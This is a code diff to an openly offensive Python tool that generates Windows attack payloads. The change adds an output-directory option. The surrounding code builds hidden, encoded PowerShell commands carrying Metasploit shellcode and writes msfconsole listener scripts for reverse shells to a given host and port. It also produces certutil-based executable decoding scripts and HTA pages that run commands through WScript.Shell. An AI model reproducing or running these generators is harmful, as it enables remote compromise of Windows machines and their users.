@@ -110,7 +110,7 @@ def generate_powershell_command(shellcode):
     return "powershell -window hidden -enc %s" % shellcode
 
 
-def generate_powershell_attack(payload, host, port):
+def generate_powershell_attack(payload, host, port, output_dir):
     """generate shellcode: 0x00,0x00,0x00,..."""
     shellcode = generate_msf_shellcode(payload, host, port)
     shellcode = re.sub("\\\\x", "0x", shellcode)
@@ -139,31 +139,31 @@ def generate_powershell_attack(payload, host, port):
                   "set EnableStageEncoding true\n"
                   "exploit -j\n") % (payload, host, port)
 
-    ps_dirname = "powershell_attack"
+    output_dir = output_dir if output_dir else "powershell_attack"
     ps_msf_filename = "powershell_msf.rc"
     ps_script_filename = "powershell_hacking.bat"
 
-    if not os.path.isdir(ps_dirname): os.makedirs(ps_dirname)
+    if not os.path.isdir(output_dir): os.makedirs(output_dir)
     logging.info('create msfconsole resource script')
-    write_file("%s/%s" % (ps_dirname, ps_msf_filename), msfcommand)
+    write_file(os.path.join(output_dir, ps_msf_filename), msfcommand)
 
     logging.info('create powershell shellcode command')
-    write_file("%s/%s" % (ps_dirname, ps_script_filename), powershell_cmd)
+    write_file("%s%s%s" % (output_dir, os.sep, ps_script_filename), powershell_cmd)
 
     return powershell_cmd, msfcommand
 
 
-def generate_cert_attack(filename):
+def generate_cert_attack(filename, output_dir):
     if not os.path.isfile(filename):
         logging.info("Please set a file for cert attack")
         sys.exit()
 
-    crt_dirname = "cert_attack"
+    output_dir = output_dir if output_dir else "cert_attack"
     crt_encode_filename = "cert_encode.crt"
     crt_decode_filename = "cert_decode.bat"
 
-    crt_encode_filepath = "%s/%s" % (crt_dirname, crt_encode_filename)
-    if not os.path.isdir(crt_dirname): os.makedirs(crt_dirname)
+    crt_encode_filepath = "%s%s%s" % (output_dir, os.sep, crt_encode_filename)
+    if not os.path.isdir(output_dir): os.makedirs(output_dir)
     if os.path.isfile(crt_encode_filepath): os.remove(crt_encode_filepath)
 
     # Translate a binary file to coreutil prep format.
@@ -176,17 +176,15 @@ def generate_cert_attack(filename):
     write_file(crt_encode_filepath, data)
 
     # Create a windows batch decode script (.bat)
-    crt_decode_script_filepath = "%s/%s" % (crt_dirname, crt_decode_filename)
     data = "certutil -decode %s encoded.exe" % crt_encode_filename
     logging.info('create a windows batch script for decode')
-    write_file(crt_decode_script_filepath, data)
+    write_file(os.path.join(output_dir, crt_decode_filename), data)
 
 
-
-def generate_hta_attack(command):
+def generate_hta_attack(command, output_dir):
+    output_dir = output_dir if output_dir else "windows_hta_attack"
     hta_module = "module.hta"
     hta_index = "index.html"
-    hta_dirname = "windows_hta_attack"
 
     hta_module_code = ("<script>\n"
             "a=new ActiveXObject(\"WScript.Shell\");\n"
@@ -201,13 +199,13 @@ def generate_hta_attack(command):
             "frameborder=0 marginheight=0 "
             "marginwidth=0 scrolling=no></iframe>" % hta_module)
 
-    if not os.path.isdir(hta_dirname): os.makedirs(hta_dirname)
+    if not os.path.isdir(output_dir): os.makedirs(output_dir)
 
     logging.info('create hta index file')
-    write_file("%s/%s" % (hta_dirname, hta_index), hta_index_code)
+    write_file(os.path.join(output_dir, hta_index), hta_index_code)
 
     logging.info('create hta module file')
-    write_file("%s/%s" % (hta_dirname, hta_module), hta_module_code)
+    write_file(os.path.join(output_dir, hta_module), hta_module_code)
 
     return hta_index_code, hta_module_code
 
@@ -287,13 +285,13 @@ def macro_attack_help():
 
 def banner():
     banner = """
-     ######
-      #     #  ####  #    #  ####  ######
-       #     # #      ##  ## #      #
-        ######   ####  # ## #  ####  #####
-         #            # #    #      # #
-          #       #    # #    # #    # #
-           #        ####  #    #  ####  #
+        ++++++
+        +     +  ++++  +    +  ++++  ++++++
+        +     + +      ++  ++ +      +
+        ++++++   ++++  + ++ +  ++++  +++++
+        +            + +    +      + +
+        +       +    + +    + +    + +
+        +        ++++  +    +  ++++  +
     """
 
     logging.info(banner)
@@ -321,6 +319,10 @@ def help():
         hta_opts.add_option('--command', dest='command', type='str', help='command of attack mode')
         parser.add_option_group(hta_opts)
 
+        output_opts = OptionGroup(parser, "Output Direcroty", "Write payload file or script to the destination directory")
+        output_opts.add_option('--output', dest='output', type='str', help='please a output directory (not a file), default: current directory')
+        parser.add_option_group(output_opts)
+
         (args, _) = parser.parse_args()
     except (OptionError, TypeError) as e:
         parser.error(e)
@@ -339,14 +341,14 @@ if __name__ == "__main__":
 
     if attacktype == 'ps':
         if args.payload and args.lhost and args.lport:
-            generate_powershell_attack(args.payload, args.lhost, args.lport)
+            generate_powershell_attack(args.payload, args.lhost, args.lport, args.output)
         else:
             banner()
             powershell_attack_help()
 
     elif attacktype == 'mac':
         if args.payload and args.lhost and args.lport:
-            powershell_cmd, msfcommand = generate_powershell_attack(args.payload, args.lhost, args.lport)
+            powershell_cmd, msfcommand = generate_powershell_attack(args.payload, args.lhost, args.lport, args.output)
             generate_macro_attack(powershell_cmd)
         else:
             banner()
@@ -354,14 +356,14 @@ if __name__ == "__main__":
 
     elif attacktype == 'crt':
         if args.filename:
-            generate_cert_attack(args.filename)
+            generate_cert_attack(args.filename, args.output)
         else:
             banner()
             cert_attack_help()
 
     elif attacktype == 'hta':
         if args.command:
-            generate_hta_attack(args.command)
+            generate_hta_attack(args.command, args.output)
         else:
             banner()
             hta_attack_help()
